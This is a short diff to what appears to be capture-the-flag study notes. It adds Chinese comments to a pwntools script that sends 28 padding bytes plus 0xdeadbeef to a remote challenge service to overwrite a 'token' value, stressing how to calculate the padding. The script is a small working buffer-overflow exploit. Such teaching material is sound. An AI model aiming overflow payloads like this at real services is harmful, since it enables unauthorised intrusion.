@@ -202,8 +202,10 @@ r = remote('120.114.62.213', 6125)
 
 payload = b'A'*28
 
-r.sendline(payload + p64(0xdeadbeef))
-
+r.sendline(payload + p64(0xdeadbeef))   <==== payload:要蓋多少
+                                        <==== 讓token的值變成p64(0xdeadbeef)
+                                        <==== 讓token(位址)的值變成(覆寫入)p64(0xdeadbeef)
+                                        <==== 重點是  payload:要蓋多少  如何計算!!
 r.interactive()
 ```
 
